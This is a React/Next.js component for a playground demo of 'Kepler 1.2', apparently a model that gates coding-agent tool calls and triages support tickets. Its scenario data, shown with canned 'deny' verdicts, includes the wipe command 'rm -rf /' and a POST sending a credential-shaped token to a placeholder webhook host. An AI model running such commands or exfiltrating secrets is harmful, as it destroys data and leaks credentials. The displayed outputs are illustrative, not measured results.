"use client";

import Image from "next/image";
import { useEffect, useState, useTransition } from "react";
import { ArrowRight } from "lucide-react";
import { Button } from "@/components/ui/button";
import { cn } from "@/lib/utils";
import { siteConfig } from "@/lib/site";

type GateVerdict = "allow" | "ask" | "deny";

type GateScenario = {
  id: string;
  label: string;
  blurb: string;
  kind: "gate";
  state: Record<string, unknown>;
  question: string;
  result: {
    choice: GateVerdict;
    confidence: number;
    ms: number;
    probs: Record<GateVerdict, number>;
  };
};

type TriageScenario = {
  id: string;
  label: string;
  blurb: string;
  kind: "triage";
  state: Record<string, unknown>;
  question: string;
  result: {
    team: string;
    urgent: boolean;
    refund: boolean;
    ms: number;
    teamProbs: Record<string, number>;
  };
};

type Scenario = GateScenario | TriageScenario;

/** Illustrative playground outputs aligned with Kepler 1.2 System One surface. */
const scenarios: Scenario[] = [
  {
    id: "wipe",
    label: "Destructive shell",
    blurb: "Should an agent run a wipe command?",
    kind: "gate",
    state: {
      tool: "shell",
      command: "rm -rf /",
      cwd: "/workspace",
      agent: "cursor",
      goal: "cleanup",
    },
    question: "Should the coding agent run this call?",
    result: {
      choice: "deny",
      confidence: 0.75,
      ms: 33,
      probs: { allow: 0.13, ask: 0.12, deny: 0.75 },
    },
  },
  {
    id: "status",
    label: "Safe inspect",
    blurb: "Read-only git status on a project checkout.",
    kind: "gate",
    state: {
      tool: "shell",
      command: "git status",
      cwd: "/workspace",
      agent: "cursor",
      goal: "inspect",
    },
    question: "Should the coding agent run this call?",
    result: {
      choice: "allow",
      confidence: 0.66,
      ms: 31,
      probs: { allow: 0.66, ask: 0.2, deny: 0.15 },
    },
  },
  {
    id: "triage",
    label: "Support triage",
    blurb: "Route a double-charge refund with urgency.",
    kind: "triage",
    state: {
      message: "I was charged twice. Refund me today — this is urgent.",
      channel: "email",
      product: "kyros",
    },
    question: "Which team? Is it urgent? Is it a refund?",
    result: {
      team: "billing",
      urgent: true,
      refund: true,
      ms: 38,
      teamProbs: {
        billing: 0.82,
        technical: 0.08,
        sales: 0.05,
        other: 0.05,
      },
    },
  },
  {
    id: "secret",
    label: "Secret tripwire",
    blurb: "Outbound call carrying a credential-shaped token.",
    kind: "gate",
    state: {
      tool: "http",
      method: "POST",
      url: "https://hooks.example.com/x",
      body: { token: "OPENAI_KEY_EXAMPLE_NOT_REAL" },
      agent: "claude-code",
      goal: "debug",
    },
    question: "Should the coding agent run this call?",
    result: {
      choice: "deny",
      confidence: 0.76,
      ms: 34,
      probs: { allow: 0.12, ask: 0.12, deny: 0.76 },
    },
  },
];

const verdictTone: Record<GateVerdict, string> = {
  allow: "text-emerald-300",
  ask: "text-amber-300",
  deny: "text-rose-300",
};

export function PlaygroundConsole() {
  const [activeId, setActiveId] = useState(scenarios[0].id);
  const [pending, startTransition] = useTransition();
  const [running, setRunning] = useState(false);
  const [shown, setShown] = useState(false);
  const scenario = scenarios.find((s) => s.id === activeId) ?? scenarios[0];

  useEffect(() => {
    setShown(false);
    setRunning(false);
  }, [activeId]);

  function decide() {
    setRunning(true);
    setShown(false);
    startTransition(() => {
      window.setTimeout(() => {
        setRunning(false);
        setShown(true);
      }, 420);
    });
  }

  return (
    <div className="overflow-hidden rounded-[4px] border border-white/10 bg-[#0c0c0e]">
      <div className="flex flex-wrap items-center justify-between gap-3 border-b border-white/5 px-4 py-3 md:px-5">
        <div className="flex items-center gap-3">
          <Image
            src="/brand/kepler-avatar.png"
            alt=""
            width={44}
            height={44}
            className="size-11 rounded-[4px] object-cover"
          />
          <span className="type-mono-caption text-muted-foreground">
            kepler · playground · 1.2
          </span>
        </div>
        <span className="type-mono-caption text-muted-foreground">
          checkpoint · {siteConfig.keplerModelId}
        </span>
      </div>

      <div className="flex flex-wrap gap-2 border-b border-white/5 px-4 py-3 md:px-5">
        {scenarios.map((s) => (
          <button
            key={s.id}
            type="button"
            onClick={() => setActiveId(s.id)}
            className={cn(
              "type-mono-caption rounded-[4px] px-3 py-1.5 transition-colors",
              s.id === activeId
                ? "bg-signal/15 text-signal"
                : "bg-white/[0.03] text-muted-foreground hover:text-foreground",
            )}
          >
            {s.label}
          </button>
        ))}
      </div>

      <div className="grid lg:grid-cols-2">
        <div className="border-b border-white/5 p-5 md:p-6 lg:border-r lg:border-b-0">
          <p className="type-mono-eyebrow text-signal">State</p>
          <p className="type-caption mt-2 text-muted-foreground">
            {scenario.blurb}
          </p>
          <pre className="type-mono-caption mt-4 max-h-[280px] overflow-auto rounded-[4px] border border-white/5 bg-black/40 p-4 text-[#c4c4cc]">
            {JSON.stringify(scenario.state, null, 2)}
          </pre>

          <p className="type-mono-eyebrow mt-6 text-signal">Question</p>
          <div className="mt-3 rounded-[4px] border border-white/5 bg-white/[0.02] px-4 py-3">
            <p className="font-mono text-[12px] text-foreground">
              {scenario.kind === "gate"
                ? "choice → allow / ask / deny"
                : "choice + noul → team / urgent / refund"}
            </p>
            <p className="type-caption mt-2 text-muted-foreground">
              {scenario.question}
            </p>
          </div>

          <Button
            type="button"
            size="lg"
            className="mt-6 w-full sm:w-auto"
            onClick={decide}
            disabled={running || pending}
          >
            {running ? "Deciding…" : "Run Kepler"}
            {!running ? <ArrowRight data-icon="inline-end" /> : null}
          </Button>
        </div>

        <div className="p-5 md:p-6">
          <div className="flex items-center justify-between gap-3">
            <p className="type-mono-eyebrow text-signal">Answer</p>
            {shown ? (
              <span className="animate-pulse-glow type-mono-label text-signal">
                {scenario.result.ms}ms · 1 pass
              </span>
            ) : (
              <span className="type-mono-label text-muted-foreground">
                waiting
              </span>
            )}
          </div>

          {!shown ? (
            <div className="mt-8 rounded-[4px] border border-dashed border-white/10 bg-white/[0.015] px-5 py-10 text-center">
              <p className="type-body-md text-muted-foreground">
                {running
                  ? "One forward pass…"
                  : "Pick a scenario and press Run Kepler."}
              </p>
            </div>
          ) : scenario.kind === "gate" ? (
            <GateAnswer result={scenario.result} />
          ) : (
            <TriageAnswer result={scenario.result} />
          )}
        </div>
      </div>
    </div>
  );
}

function GateAnswer({ result }: { result: GateScenario["result"] }) {
  return (
    <div className="animate-rise mt-5 flex flex-col gap-5">
      <div className="rounded-[4px] border border-white/10 bg-white/[0.02] px-4 py-4">
        <p className="type-mono-caption text-muted-foreground">action</p>
        <p
          className={cn(
            "mt-2 font-mono text-3xl font-medium tracking-tight",
            verdictTone[result.choice],
          )}
        >
          {result.choice}
        </p>
        <p className="type-mono-caption mt-2 text-signal">
          conf {result.confidence.toFixed(2)}
        </p>
      </div>
      <ProbBars
        probs={result.probs}
        highlight={result.choice}
        tones={verdictTone}
      />
      <p className="type-caption text-muted-foreground">
        Typed answer. No prose. Same checkpoint you download free on Hugging
        Face.
      </p>
    </div>
  );
}

function TriageAnswer({ result }: { result: TriageScenario["result"] }) {
  return (
    <div className="animate-rise mt-5 flex flex-col gap-5">
      <div className="rounded-[4px] border border-white/10 bg-white/[0.02] px-4 py-4">
        <p className="type-mono-caption text-muted-foreground">team</p>
        <p className="mt-2 font-mono text-3xl font-medium tracking-tight text-signal">
          {result.team}
        </p>
      </div>
      <div className="grid grid-cols-2 gap-3">
        <div className="rounded-[4px] border border-white/10 bg-white/[0.02] px-4 py-3">
          <p className="type-mono-caption text-muted-foreground">urgent</p>
          <p className="mt-1 font-mono text-xl text-emerald-300">
            {result.urgent ? "true" : "false"}
          </p>
        </div>
        <div className="rounded-[4px] border border-white/10 bg-white/[0.02] px-4 py-3">
          <p className="type-mono-caption text-muted-foreground">refund</p>
          <p className="mt-1 font-mono text-xl text-emerald-300">
            {result.refund ? "true" : "false"}
          </p>
        </div>
      </div>
      <ProbBars probs={result.teamProbs} highlight={result.team} />
      <p className="type-caption text-muted-foreground">
        New in 1.2 — support triage on the same open local System One surface.
      </p>
    </div>
  );
}

function ProbBars({
  probs,
  highlight,
  tones,
}: {
  probs: Record<string, number>;
  highlight: string;
  tones?: Record<string, string>;
}) {
  return (
    <div>
      <p className="type-mono-eyebrow text-signal">Distribution</p>
      <div className="mt-3 flex flex-col gap-3">
        {Object.entries(probs).map(([key, p]) => (
          <div key={key}>
            <div className="mb-1.5 flex items-baseline justify-between">
              <span
                className={cn(
                  "type-mono-caption",
                  key === highlight
                    ? (tones?.[key] ?? "text-signal")
                    : "text-muted-foreground",
                )}
              >
                {key}
              </span>
              <span className="type-mono-caption text-muted-foreground">
                {(p * 100).toFixed(0)}%
              </span>
            </div>
            <div className="h-1.5 overflow-hidden rounded-full bg-white/[0.06]">
              <div
                className={cn(
                  "h-full rounded-full transition-all duration-500",
                  key === "deny"
                    ? "bg-rose-400/80"
                    : key === "ask"
                      ? "bg-amber-400/80"
                      : key === highlight
                        ? "bg-signal/80"
                        : "bg-emerald-400/80",
                )}
                style={{ width: `${Math.max(p * 100, 2)}%` }}
              />
            </div>
          </div>
        ))}
      </div>
    </div>
  );
}
